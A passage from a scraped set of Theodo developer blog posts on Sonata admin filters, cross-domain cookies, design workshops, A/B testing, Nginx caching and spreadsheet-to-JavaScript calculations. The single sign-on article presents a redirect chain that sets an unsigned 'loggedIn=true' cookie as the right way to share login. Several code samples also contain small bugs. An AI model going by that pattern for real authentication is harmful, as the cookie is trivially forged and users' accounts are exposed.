    public function createQuery($context = 'list')
    {
        $query = parent::createQuery($context);
        $rootAlias = $query->getRootAliases()[0];

        // Make sure we have the last filters in memory
        $this->hiddenFilters = $this->readHiddenFilters();

        // Do any kind of check on those filters, here we check that ""statusPendingFilter: true"" was set
        if (is_array($this->hiddenFilters) && array_key_exists('statusPendingFilter', $this->hiddenFilters) && $this->hiddenFilters['statusPendingFilter']) {
            $query
                ->andWhere($query->expr()->eq($rootAlias . '.status', ':statusPending'))
                ->setParameter('statusPending', 'PENDING')
                ;
        }
        
        return $query;
    }
}

Now, when you want to activate a hidden filter on your list, call it with the correct parameters in the URL:
<a href=""{{ path('admin_application_list', {'hiddenFilters' : {'statusPendingFilter' : true}}) }}"">

$this->router->generate('admin_application_list', array('hiddenFilters[statusPendingFilter]' => true));


Save your hidden filters as persistent parameters

You now have great filters you can enable and disable at will. Last issue: when you edit an element and then come back to the list your filters have disappeared.
The fix for that is to use Sonata’s persistent parameters: it’s a really handy function that will had your filters to all the Sonata generated links.
Add that to your admin class:
public function getPersistentParameters()
{
    $parameters = parent::getPersistentParameters();

    if (!$this->getRequest()) {
        return array();
    }

    return array_merge($parameters, array(
        'hiddenFilters' => is_array($this->hiddenFilters) ? json_encode($this->hiddenFilters) : $this->hiddenFilters,
    ));
}

Notice that we had to JSON_encode our filters because persistent parameters can only be strings.
That means we are going to have to change our readHiddenFilters function to decode the JSON:
private function readHiddenFilters()
{
    return is_array($this->getRequest()->query->get('hiddenFilters')) ?
        $this->getRequest()->query->get('hiddenFilters') :
        json_decode($this->getRequest()->query->get('hiddenFilters'), true);
}

That’s it! You have fully customizable and activable hidden filters!
The full code : 30 lines
Here is the full code of working hidden filters:
class ApplicationAdmin extends SonataAdmin
{
    private $hiddenFilters;
    
    public function __construct($code, $class, $baseControllerName)
    {
        parent::__construct($code, $class, $baseControllerName);
        $this->hiddenFilters = $this->readHiddenFilters();
    }
    
    private function readHiddenFilters()
    {
        return is_array($this->getRequest()->query->get('hiddenFilters')) ?
            $this->getRequest()->query->get('hiddenFilters') :
            json_decode($this->getRequest()->query->get('hiddenFilters'), true);
    }
    
    public function getPersistentParameters()
    {
        $parameters = parent::getPersistentParameters();
    
        if (!$this->getRequest()) {
            return array();
        }
    
        return array_merge($parameters, array(
            'hiddenFilters' => is_array($this->hiddenFilters) ? json_encode($this->hiddenFilters) : $this->hiddenFilters,
        ));
    }
    
    public function createQuery($context = 'list')
    {
        $query = parent::createQuery($context);
        $rootAlias = $query->getRootAliases()[0];
        
        if (array_key_exists('statusPendingFilter', $this->hiddenFilters) && $this->hiddenFilters['statusPendingFilter']) {
            $query
                ->andWhere($query->expr()->eq($rootAlias . '.status', ':statusPending'))
                ->setParameter('statusPending', Application::STATUS_PENDING)
                ;
        }
        
        return $query;
    }
}


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Victor Duprez
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Track users over different domains is a recurrent issue while developing a substantial web solution. Use cases are countless:

authenticate customers over different websites (Google-like single sign-on);
cross-sell based on what they have visited previously on other websites;
customize user experience;
analytics.

Let’s say we are trying to build a single authentication between two domains: my-account.com and webmail.com.
We are considering the following scenario, following a specific user named Jack:

How can we get webmail.com to know that its users are already logged in on my-account.com?
Setting cross-domain cookies?
The first approach that comes to mind is to set a cookie on my-account.com users’ web browser as soon as they are authenticated on this website and to use these cookies later on webmail.com.
At first glance, this solution seems staight-forward: setting a cookie is easy and can be achieve within a few lines of codes using PHP or JS.
<?php
setcookie(""loggedIn"", true);

Unfortunately, here we encounter our first problem:
There is an important web concept called ‘Same origin policy’ that prevents one website to access another website resources through user’s browser.
Amongst other things, this rule specify that cookies are specific to a given domain. Nor webmail.com is able to read my-account.com related cookies, nor my-account.com is capable of writing its own on webmail.com.
And this for user security purposes: you don’t want a malicious page to get access my-bank-account.com session cookies.
So, how do we deal with this problem? How does Google, Microsoft & Co deal with it?
The wrong way: using AJAX requests (CORS)
OK, cookies are tied to a specific domain. Why not using a custom-made AJAX request from my-account.com on webmail.com and forcing webmail.com to settle its own cookie?

We can implement this interaction within a few line on both sides:
On my-account.com:
var xmlHttp = new XMLHttpRequest();
xmlHttp.open(""GET"", ""http://webmail.com/set-authentication-cookie.php"", true);
xmlHttp.send(null);
set-authentication-cookie.php on webmail.com :
<?php
setcookie(""loggedIn"", true);

And… this is unsuccessful! After visiting my-account.com, no cookie is set on webmail.com.
We should have a look at JS console:
XMLHttpRequest cannot load http://webmail.com/set-authentication-cookie.php.
No 'Access-Control-Allow-Origin' header is present on the requested resource.
Origin 'http://account.com' is therefore not allowed access.
Browsers are a lot smarter than we first thought.
As we said, requests are restricted by the same-origin policy that prevents web browsers from executing code coming from another domain.
However this prevents legitimate behaviors between domains too even if domains are known and trusted.
What about CORS ?
Cross-origin resource sharing (CORS) is a W3C system that enables a given domain to request some resources (stylesheets, images, css, scripts…) from another domain.
CORS are built on top of XMLHttpRequest(). It actually softens same-origin policy to enable cross-domain requests. Of course, it needs some coordination between servers.
We need to add the following attribute to AJAX script:
xmlHttp.withCredentials = true
And specific headers to target PHP page:
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: my-account.com');
As soon as you do so, we should be able to perform our AJAX request:
my-account.com:
var xmlHttp = new XMLHttpRequest();
xmlHttp.open(""GET"", ""http://webmail.com/set-authentication-cookie.php"", true);
xmlHttp.withCredentials = true;
xmlHttp.send(null);
webmail.com:
<?php
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: http://my-account.com');
setcookie(""loggedIn"", true);

And… seems to works! As we navigate on my-account.com, a loggedIn cookie is set on webmail.com for later use.
Time for bad news
This approach is effective as long as third-party cookies are allowed in client configuration.
If Firefox and Chrome authorize third-party cookies by default, IE9+/Edge and Safari are far more susceptible.
Safari use enforced cookies policy that disable third-party cookies, plain and simple.
Internet Explorer (as usual) follows its own rules. It refuses such cookies unless you are using a P3P policy.
P3P is an old, deserted and unfinished (Firefox has given up supporting it) W3C spec and I won’t recommend using it.
As we can’t obviously ask our users to modify their settings for us, we are therefore at an impasse.
Futhermore, it doesn’t matter what technical solution we choose: AJAX request, <img> tag, JS script, iframe…
Even if we find a workaround, it won’t be a sustainable solution since browsers will likely fix it later.
The right way: using HTTP Redirections
Asynchronous requests don’t seem to do the trick. What about synchronous ones?
We need to perform two consecutive redirections and set cookies for each domain when needed:

This approach is transparent and painless for the user. It requires no Javascript and don’t rely upon browser configuration:
index.php on my-account.com:
<?php
if (!isset($_COOKIE['alreadyRedirected'])) {
setcookie(""alreadyRedirected"", true);
header('Location: http://webmail.com/set-authentication-cookie.php');
}

set-authentication-cookie.php on my-account.com:
<?php
setcookie(""loggedIn"", true);
header('Location: http://account.com/index.php');

This time, loggedIn cookie is set and available on webmail.com once user has visited my-account.com page.
Best solutions are often simpler than we think, aren’t they?
Conclusions
CORS requests is a powerful tool to perform cross-domain requests.
Nevertheless, it’s not suitable for implementing cross-domain or third-party cookies because of some browsers default settings (Safari and IE/Edge).
HTTP redirections turns out to be the easiest and the most effective way of creating a single sign-on system.
This approach can easily be generalized: have fun tracking users over multiple websites!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Charles BOCHET
  			
  				Web developer @Theodo  			
  		
    
			

									"
"
										You want to know how you can move from this design…

…to this new one

in two weeks in your project?
This article aims at giving you precise guidelines on how to build a custom-made interface without any – conscious – prior knowledge of design.
Let’s get started!
1. Spot the Need
A great design is a design led by a real user need in terms of ergonomy. Making a gratuitous ergonomy is a waste of time for your project.
A good ergonomy need can be expressed this way: “As a user, I can…”. The more precise the user’s need is, the better the resulting design is.
The website TrainLine is a great example of ergonomy that was built towards one precise and motivating user need: “As a user, I can book a train ticket in less than one minute”. Such a good need is essential as it drives the designing and the development processes all the way.
There are two options to get a user need:

if you have had the opportunity to meet the users or to get user feedbacks, take them into account to define with your client a precise user need;
if you couldn’t reach the users, don’t panic! Make multiple hypotheses on different user needs and use cases and build different designs based upon them.

2. Analyse the Need
Now that you are focused on precise use cases and ergonomy goals, it is time to analyse your application’s features and components with respect to those.
Plan a “design workshop” of approximately half a day. The expected output is a document you will give to your client, just like this one:


improvement points that you spotted about the existing ergonomy: misplaced buttons, lacking functionality…
design proposals that state the hypotheses made about user needs, the global behaviour of the application on a use case – “this panel opens when I click that button…” – and screenshots of model applications, if possible
a comparison table in which you mention the development complexity, the advantages and drawbacks of each solution along with the opinion of the development team about the most adapted solution.

Ask your fellow developers their opinion about the usability of this or that component, the position of this panel, existing model applications that they possibly know about that would be a great source of inspiration for your design – do not hesitate to use screenshots! You may be surprised: in a way, a web developer is a user experience specialist as they spend their time surfing on the Internet and making web applications. If you have any doubt about that, don’t hesitate to show your current application around you: you will get a bunch of usability feedbacks.
Think about the UX library you want to use. I personally love Google Material, and its specifications are very useful to build your design if you are not sure of where to position a panel or which size should a button be.
Keep in mind that you want something that is both pretty and usable. To avoid creating beautiful but useless components – a slider that only allows the user to choose between the two extremal values, for instance -, always think as if you were a user of the application, in terms of use cases.
3. Prepare Your Design
The document that you just sent to your client is certainly of great value, but now your client wants a glimpse of what his application could look like. This is the moment you can really create value and convince your client. According to a client that I had on a project:
What helped us the most during the design workshop were the templates and the fact that we could adjust things live together.
What you have to do is transform what you said in the previous document in images. Several tools can help you do that:

Software like Moqups are great for they allow you to pick components from famous libraries – such as Material and Bootstrap -, customize them to your needs and integrate them in your templates.
More generic tools like Photoshop or Gimp also do the trick if you are used to them, although the exercise is a little bit different. I suggest taking screenshots of the components and pasting them into your image document according to your needs. I personally use React Toolbox whose website features a playground for each component, in which you can customize your component’s behaviour and appearance before you copy it to your document. If the library that you want to use does not come with that kind of playground, you can tweak the component directly using the Chrome inspector.

What you want to do is showing not only the components you want to use, but also how they come together in your ergonomy. Here is an example of what you can do with Moqups:

Focus on components: unlike webdesigners, you know the libraries you can use to design your application, which makes it easy for you to estimate how much it will cost to your client to transform the application ergonomy.
Prefer using an existing and reusable component rather than creating one from scratch. Of course your client may have specific needs, but sometimes there is a good reason why an awkward custom-made component does not exist…
Prepare yourself to edit your design “live”. When you meet your client or the users, it is very useful to discuss the design while editing it live. This way you can adjust the ergonomy to the user’s need.
4. Convince Your Client
You are now ready to show your work to your client.
Set up a workshop with the main members of the project – your client and the stakeholders – and the people who may have an influence over your design – users of course, but also marketing.
You will take the lead for the first part of the workshop: show your templates and explain the choices you made in terms of ergonomy.
Do not hesitate to show the behaviour of your components: the animations of your graphs or inputs are always a good way to impress people and bring life into your design.
You can then discuss details with the stakeholders and the users.
Write down their feedbacks and adapt your design to their needs: play with your templates to give your users live results of their ideas.
5. Develop and iterate
At this moment the best is yet to come and you made the hardest part of the work. Turning your design templates into development tickets should now be quite easy.

Try to create the smallest development tickets: adding a button, moving an input from one panel to another or adding a header are features without uncertainty that you can easily estimate.
Always keep in mind that your application has to stay functional throughout the process: building a new ergonomy is a waste of time if you loose the features, even temporarily.

The most important thing is to continuously incorporate improvement in your ergonomy. Reach the users as often as you can to get their feedback: this way you can iterate over the process to create an application that fits the user’s needs perfectly.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Loïc Gelle
  			
  				Agile web developer at Theodo.  			
  		
    
			

									"
"
										Have you ever met a coworker or client which is persuaded that you should do this way while you think it’d be better that way?
Instead of infinite debate what you need is facts!
Let’s Not Make a Choice!

The choice is not yours, it belongs to your users.
The aim of A/B testing (or split testing) is to scientifically prove that a solution A is better than another solution B to achieve a measurable goal.
You compare the two solutions by randomly offering one of the two solutions and then measure the effectiveness of each.
You’ll need a goal, a metric and several solutions to test.
We Want You To Join Us
Super Simple Example
At Theodo we want people to join us.
Goal: get visitors on the join us page
And by chance we love to write articles! One way to achieve our goal is to convert the readers in appliers.
Metric: Conversion rate readers -> appliers
Except some people want a button while others prefer a link.
A/B Solutions: button/link
Let’s Do This!
What you shouldn’t do
Alright, let’s put a button for a couple weeks and then change to put a link.
After your experiment you see that you had 10 clicks during the two first weeks and 20 in the two last. The link seems better!
But wait, on the third week our CEO was invited on a TV show. This introduced a huge bias.
The experiment shall not be time dependent. Hence to avoid any bias we include randomness.
Let’s code this right
To A/B test you don’t need much.
The core piece of code is this:
var ABTest = Math.random() >= 0.5;

If you add some logic:
var ABDivInnerHtml
var myUrl = myUrl
var ABTest = Math.random() >= 0.5;
if (ABTest) {
  ABDivInnerHtml = ""<button onclick=\""location.href='"" + myUrl + ""';\""> Join Us </button>"";
} else {
  ABDivInnerHtml = ""<a href=\"""" + myUrl + ""\""> Join Us </a>""
};
document.getElementById(""ABDiv"").innerHTML = ABDivInnerHtml;

<div id=""ABDiv""></div>

Is that all?
Well you’ll need a little more. How do we measure?
A super easy solution is Google Analytics. It lets you do a LOT of stuff I won’t talk about in this article except visitor counting and event monitoring.


create an account on Google Analytics so you have a Tracking ID.


include this script in your header:


  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  var trackId = YourTrackingId
  ga('create', trackId, 'auto');
  ga('send', 'pageview');

the last line tracks the viewers of your page.

to watch an event call this function:

ga('send', 'event', [eventCategory], [eventAction], [eventLabel])

for exemple if we want to track the clicks on the button for the JoinUs page:
ga('send', 'event', 'button', 'click', 'Join Us')


Analyse your results here
In our case, with a conversion rate of 1% and a Minimum detectable effect of 25%, the result gets significative once you’ve reached 25000 visitors. If you want to dig in A/B test statistics see this page to compute your significative sample size.

Et Voila !
Your file should look like this:
<!DOCTYPE html>
<html>
  <head>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      var trackId = YourTrackingId
      ga('create', trackId, 'auto');
      ga('send', 'pageview');
    </script>
  </head>
  <body>

    <div id=""ABDiv""></div>

    <script>
      var ABDivInnerHtml
      var yourUrl = ""http://www.theodo.fr/en/joinus/developer""
      var ABTest = Math.random() >= 0.5;
      if (ABTest) {
        ABDivInnerHtml = ""<button onclick=\""location.href='"" + yourUrl + ""'; ga('send', 'event', 'button', 'click', 'Join Us');\""> Join Us </button>"";
      } else {
        ABDivInnerHtml = ""<a onclick=\""ga('send', 'event', 'link', 'click', 'Join Us');\"" href=\"""" + yourUrl + ""\""> Join Us </a>"";
      };
      document.getElementById(""ABDiv"").innerHTML = ABDivInnerHtml;
    </script>

  </body>
</html>

This piece of code helped us to decide wether the button or a link at the end of a paragraph was more efficient (the button won with twice more clicks than the link).
A/B testing can be really quick to implement. It can be used in a lot of cases such as wording, images, interfaces, etc.
Get your client to give it a shot, to support your ideas or to back up his theories with actual data.
Now you can click on the button 😉

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sammy Teillet
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Web Cache?
A few days ago, Nicolas Trinquier wrote a cool article about how to improve your webapp performances using browser cache with Nginx.
Reading it will teach you that browsers can store content received from the server in order to avoid downloading it again.
You can actually use cache at different levels of your application’s infrastructure.
A web cache stands between your users’ browsers and your server. It caches server responses in its memory so that if another client asks for it again, the request will not go to the server but will be served by the web cache immediately. This can save the server from having to execute its most intensive tasks.
Nginx?
Usually, Nginx is used as a reverse proxy/load balancer for apps.
As it stands between client and server to check all of your user’s requests, it’s perfectly shaped to serve as a web cache!
Looks great! How?
To use Nginx as a web cache, we need to use some of its directives:
proxy_cache_path:
Here we will define the path where nginx will store cached content and the memory you want to allow for it.
There are two mandatory parameters, path and keys_zone:

path defines the path where nginx is going to store cached content, basically you should store this in something like /data/nginx/cache.The content to be cached is actually written to a temporary directory that you can chose by setting the use_temp_path option which is the general proxy_temp_path you set for Nginx by default.
keys_zone allows you to define the zone where the keys leading to these contents will be stored, name it as you wish and define the size you need (we speak of the keys, according to documentation, 1MB is about 8000 keys).

A word about the inactive parameter: it actually lets Nginx remove files that have not been requested during the specified duration from the cache. If not explicitly set this duration will be 10mins. This means Nginx’s cache will get rid of unused content to leave space for the most requested one – exactly what we are looking for, isn’t it?
proxy_cache:
This directive stands in a location block and allows you to link it with the keys_zone of your choice (references the keys_zone parameter of the proxy_cache_path directive).
A simple working example where we also added a header to all of our requests called ‘Web-Cache-Status’ that will be set by nginx to ‘Hit’ if the content comes from the cache or ‘Miss’ if it doesn’t:
proxy_cache_path /data/nginx/cache keys_zone=my_zone:10m inactive=60m;

server {
    listen 80 default_server;
    root /var/www/;
    index index.html index.htm;

    server_name example.com www.example.com;

    charset utf-8;

    location / {
        proxy_cache my_zone;
        add_header Web-Cache-Status $upstream_cache_status;

        include proxy_params;
        proxy_pass urlOfProxiedServer
    }
}

Going a little bit further
Stale can still be good!
You can allow Nginx to keep serving stale content if it hasn’t been modified on the server side. Whenever it finds stale content, Nginx will check the last date it was modified before trying to download it.
To do so, add proxy_cache_revalidate: on; to the ‘server’ section of your conf.
Once for all
If multiple users request content at the same time, Nginx will download the content from the server each time until it has it in the cache.
You can actually tell Nginx to download the content only once and to wait for it to be downloaded before serving it to all the users.
Just add proxy_cache_lock: on; to the correct ‘location’ section of your conf!
Bypassing web cache
Most of the time, you need to cache stuff on your client’s browser AND use a web cache.
If your browser asks for content that just expired from its cache, your web cache might just send it back without asking to the server for the freshest version.
Don’t worry, Nginx lets you set conditions in which your requests will bypass the web cache 

proxy_cache_bypass:
Lets you set the conditions in which the content will not be TAKEN FROM the web cache.
proxy_no_cache:
Lets you set the conditions in which the content will not be STORED TO the web cache.

For example:
location / {
    proxy_cache_bypass $cookie_nocache $arg_nocache;
}

Here we’re asking Nginx to go straight to the fresh content for requests showing a no cache cookie or argument.
Replace proxy_cache_bypass with proxy_no_cachein order to prevent Nginx from even storing the content in the response.
Stale is better than nothing
You can set nginx to deliver stale content if it is not able to get fresh one from the server.
That will prevent your website from showing server errors to users.
Following is a small working example, using the proxy_cache_use_stale directive, allowing nginx to show stale content in case it gets a timeout or a 5XX error from your server!
location / {
    proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
}

Here we also add an optional parameter called updating!
Doing so will let Nginx deliver stale content while it is downloading a fresh version of the file from your server!
Conclusion
These few steps help you speed up your web app really easily and are, in my humble opinion, not yet automatic among developers!
Don’t forget it next time you’re working on a project that’s likely to get big!
You can think of various solutions for your web caching, like using Varnish for instance, but it seems to me that Nginx really is one of the best candidates for you!
It is indeed very easy to configure, pretty efficient and can still handle all its other functions, like being a web server, while managing the web cache in a great way!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Sraïki
  			
  				Maxime is a web developer enthralled by value creation and web development. Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
			

									"
"
										Implementing complex calculations in a project can be quite tricky, especially when your only calculation model is a gigantic spreadsheet full of horrible formulas. The aim of this article is to guide you through the construction of a clean and functional calculation code starting from such a spreadsheet, and to show you some tips to handle calculations without any pain.
To keep it simple, our working language in this article will be Javascript, but we will design abstract patterns that can be adapted to any language.
Let’s get started!
Basic Structure and Code Pattern
Let’s describe the example spreadsheet. It aims at forecasting the month-by-month evolution of a set of parameters – temperature, species distribution, air quality,… – in an ecological niche depending on given the initial state of the environment and some calculation parameters. This evolution can be calculated according to a model that describes the interaction between the different species and between the species and their environment.
Basically, we can identify two areas in the spreadsheet: an area where we can specify the calculation parameters, and the resulting data table that has a fixed number of columns to compute – the data that we want to compute – and a number of lines that depends on the forecast duration. The general structure is quite simple in this case: we will be doing a line-by-line computation, where the values in a line only depend on the past, thus on the previously computed lines.
We could be tempted to imitate the spreadsheet’s apparent data structure by putting the result values in a matrix. I strongly advise you against doing that, as you will end up with an unreadable code full of myMatrix[i][j-1] that will be horrible to maintain. Our setup will be:

an object for the input parameters;
a table of objects for the results, each line corresponding to a calculation row.

This allows you to label the object’s values to clarify your code. Here is an example of parameters object:

var calculationParams = {
  forecastDurationInYears: 8,
  foodResources: {
    percentageForA: 10,
    percentageForB: 13
  },
  predation: {
    rateAB: 0.1,
    rateBA: 0,
    considerAB: true,
    considerBA: false
  },
  ...
  initialState: {
    month: 0,
    temperature: 28,
    speciesA: {
      population: 10000,
      ...
    },
    speciesB: {
      population: 700,
      ...
    },
    ...
  }
};

You can provide new lines to your results table using a function:

function initLine() {
  const emptyLine = {
    month: 0,
    temperature: 0,
    speciesA: {
      population: 0,
      ...
    },
    speciesB: {
      population: 0,
      ...
    }
  };
  return emptyLine;
}

Now the calculations structurally boil down to adding and filling new lines to your results table. Let’s write the main calculation function:

function computeResults(calculationParams) {
  const monthsToCompute = calculationParams.forecastDurationInYears * 12;
  var resultsTable = [];
  resultsTable.push(calculationParams.initialState);

  for(var i=1; i<monthsToCompute; i++) {
    computeLine(calculationParams, resultsTable, i);
  }

  return resultsTable;
}

and the line calculator:

function computeLine(calculationParams, resultsTable, index) {
  var newLine = initLine();
  resultsTable.push(newLine);

  computePopulationEvolutionA(calculationParams, resultsTable, index);
  computePopulationEvolutionB(calculationParams, resultsTable, index);
  // and so on!
}

What we just did looks like nothing, but the pattern we created allows you to handle the formulas and the calculation logic separately. You can now write the core calculation functions to compute the columns.
Writing the Formulas
What I suggest is to take a few minutes to analyse the formulas in your spreadsheet and to write them down in a documentation file in understandable terms. This extra step gives you a file to keep track of the formulas – essential if you want someone else to understand your code without the spreadsheet – and it accelerates development. Indeed, there is nothing more annoying than starting to code a feature without being 100% sure of what it will look like down to the last detail. To convince yourself of the importance of this step, try to imagine what inspires you the most between
=IF($B$4;IF($E50>$B$11;($E$2-$G$3*SUMIFS($H$10:$H49;$A$10:$A49;"">$A50-36""))*$F50;0);IF($F50>0;($I$5-$I$6*(SUMIFS($H$10:$H49;$X50;true)-SUM($I$10:$I49)));0))
and

IF take predation A -> B into account
	IF population A > predation threshold
		populationEvolutionB = (reproductionRateA - predationRateAB * (sum on all the births for species B on the past 3 years)) *  population B
	ELSE
		 populationEvolutionB = 0
ELSE
	IF population B > 0
		populationEvolutionB = (birth rate B - death rate B) * ((sum on all the births of B in viable past months) - (sum on all the deaths of B over the past months))
	ELSE
		populationEvolutionB = 0

When coding, the second option is way better! When turning this formula into a function it gives us, without trying to refactor at first:

function computePopulationEvolutionB(calculationParams, resultsTable, index) {
  var line = resultsTable[index];
  line.speciesB.evolution = 0;

  var sumBirths3Years = 0;
  var sumBirthsViable = 0;
  var sumDeaths = 0;
  for (var i=0; i < index; i++) { var loopLine = resultsTable[i]; if (loopLine.month >= line.month - 36)
      sumBirths3Years += loopLine.speciesB.births;
    if (loopline.speciesB.viableBirth)
      sumBirthsViable += loopLine.speciesB.births;
    sumDeaths += loopLine.speciesB.deaths;
  }

  if (calculationParams.predation.considerAB)
    if (line.speciesA.population > calculationParams.predation.threshold)
      line.speciesB.evolution = line.speciesB.population * (calculationParams.reproduction.rateA - calculationParams.predation.rateAB * sumBirths3Years);
  else
    if (line.speciesB.population > 0)
      line.speciesB.evolution = (line.speciesB.birthRate - line.speciesB.deathRate) * (sumBirthsViable - sumDeaths);
}

which is not so obvious when you take a look at the spreadsheet formula…
Avoiding Redundant Calculations
We drew the most general code pattern for this kind of line-by-line calculations. Of course, the calculations themselves can be optimized, but this is specific to your formulas. If you look carefully at my previous implementation of computePopulationEvolutionB, you can notice that the calculation of the sums inside the function is completely inefficient, as I will need to recompute the sum every time I add a line to my results table.
An optimization workaround could be to create a helper object to keep track of the intermediate results:

function computeResults(calculationParams) {
  const monthsToCompute = calculationParams.forecastDurationInYears * 12;
  var resultsTable = [];
  resultsTable.push(calculationParams.initialState);

  var calculationHelper = {
    sumBirthsViableB: 0,
    sumDeathsB: 0,
    sumBirths3YearsB: 0
  };

  for(var i=0; i<monthsToCompute; i++) {
    computeLine(calculationParams, resultsTable, calculationHelper, i);
  }

  return resultsTable;
}


function computeLine(calculationParams, resultsTable, calculationHelper, index) {
  var newLine = initLine();
  resultsTable.push(newLine);

  computePopulationEvolutionA(calculationParams, resultsTable, index);
  computePopulationEvolutionB(calculationParams, resultsTable, index);
  // and so on!

  updateCalculationHelper(calculationParams, resultsTable, calculationHelper, index);
}

and to update them accordingly using a new function. You end up with a clearer and more optimized code:

function computePopulationEvolutionB(calculationParams, resultsTable, calculationHelper, index) {
  var line = resultsTable[index];
  line.firstColumn = 0;

  if (calculationParams.predation.considerAB)
    if (line.speciesA.population > calculationParams.predation.threshold)
      line.speciesB.evolution = line.speciesB.population * (calculationParams.reproduction.rateA - calculationParams.predation.rateAB * calculationHelper.sumBirths3YearsB);
  else
    if (line.speciesB.population > 0)
      line.speciesB.evolution = (line.speciesB.birthRate - line.speciesB.deathRate) * (calculationHelper.sumBirthsViableB - calculationHelper.sumDeathsB);
}

Handling Calculations Order
There is one last important thing I didn’t adress in the previous pattern. How do I know in what order I am supposed to compute the columns?
Indeed, the value A in a line can require some values B and C on the same line to be calculated first, but B may need a value D that is also a prerequisite to compute A… Argh! You could choose to draw a dependency graph out of the spreadsheet, but it is easy to make a mistake and this solution is not sustainable, for the formulas can evolve. I’ve even seen spreadsheets in which the order in which to compute the values depends on the line!
So how can you handle such a mess like spreadsheet softwares do?
One solution is to promisify your calculation functions. I will not give more details about this solution which is too specific to Javascript and which makes your code an immediate mess in this case.
I propose to choose a custom-made dependency resolver. Here is what we will do: we will store each computation function in an object, along with a state – computed or to compute and a depencency table that indicated the needed values before the calculation can be performed. In our case, it looks like

function returnComputeFunctions() {
  const computeFunctions = {
    evolutionB: {
      compute: (calculationParams, resultsTable, calculationHelper, index) => {
        var line = resultsTable[index];
        line.firstColumn = 0;

        if (calculationParams.predation.considerAB)
          if (line.speciesA.population > calculationParams.predation.threshold)
            line.speciesB.evolution = line.speciesB.population * (calculationParams.reproduction.rateA - calculationParams.predation.rateAB * calculationHelper.sumBirths3YearsB);
        else
          if (line.speciesB.population > 0)
            line.speciesB.evolution = (line.speciesB.birthRate - line.speciesB.deathRate) * (calculationHelper.sumBirthsViableB - calculationHelper.sumDeathsB);
      },
      computed: false,
      getDependencies: (calculationParams) => {
        if (calculationParams.predation.considerAB)
          return [computeFunctions.populationB, computeFunctions.birthsB];
        else
          return [computeFunctions.birthViableB, computeFunctions.deathsB];
      }
    },
    populationB: {
      ...
    },
    ...
  };
}

Now let’s write a dependency resolver function:

function resolveCalcDependencies(valueToCompute, calculationParams, resultsTable, calculationHelper, index) {
  if (!valueToCompute.computed) {
    valueToCompute.getDependencies(calculationParams).forEach((dependencyValue) => {
      resolveCalcDependencies(dependencyValue, paramsWrapper);
    });
    valueToCompute.compute(calculationParams, resultsTable, calculationHelper, index);
    valueToCompute.computed = true;
  }
}

As we are doing the calculations recursively, we just need to launch the process by telling the dependency resolver to compute the interesting values.

function computeLine(calculationParams, resultsTable, calculationHelper, index) {
  var newLine = initLine();
  resultsTable.push(newLine);

  var computeFunctions = returnComputeFunctions();
  resolveCalcDependencies(computeFunctions.evolutionB);

  updateCalculationHelper(calculationParams, resultsTable, calculationHelper, index);
}

The resolver will pull all the dependencies step by step! Amazing, isn’t it? The computed param is here to make sure that the function terminates, and that each computation is only performed once.
Going further: some tips
At this point, your calculations should be working and you may want to weep with joy. But now is also the time of refactoring and testing to make your code prettier and more sustainable! Here is what you can do:

Make your code modular. You may want to separate the value assignment from the formulas in different functions: it makes your functions shorter and testable.
Refactor. You don’t want all your functions to have the same four parameters all along the code. Wrap these four parameters into a unique variable that you can pass to all the functions.
Test. If you made your code modular by creating functions specific to the formulas, you can easily make unit tests on them to make sure that the returned values are correct. A tested code is a rock-solid code.

Conclusion
Some points to finish with:

This article does not claim to be an absolute guide to how to run calculations in a project, but it shows you global patterns and a way to reach them. Do not hesitate to adapt them to your project!
Cut your work into smaller pieces! Your first goal should be to display an empty results table with the index filled – it allows you to draw and code the general pattern -, then you can proceed column by column. The optimization steps can be included in future iterations.
If the spreadsheet is way too complex or if you have any doubt, don’t hesitate to contact your client or the spreadsheet’s author. A 30-minute long workshop on the spreadsheet will help you develop your calculation feature faster.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Loïc Gelle
  			
  				Agile web developer at Theodo.  			
  		
    
			

									"
"
										As a front-end Javascript developer, managing your source files can quickly get tricky. On the back-end side, Node has a built-in module resolver —require— whereas there is no built-in module resolver in the browsers.
In this article, I will get you started with Webpack, a very powerful tool to organize, compile and package your source files. Webpack is an module bundler that will let you compile, optimize and minify all your files: Javascript, CSS, pictures, etc.
You might have heard about Gulp as another module bundler. Compared to Webpack, Gulp can be seen as a scripting platform, that will let you chain different building tasks. Webpack is an all-in-one solution, capable of handling all your source files. Moreover, Webpack offers some very powerful features that will make your developments faster:

a module resolver for your front end source code
a hot reloader, that will replace any modified part of your code directly in the browser when you save the source file, without any page refresh.

Instead of presenting a Webpack boilerplate or starter kit, I will show you how to build a web application step by step from scratch, so that you will end up with a fully working solution that you are comfortable coding with.
Let’s get started!
Basic project structure
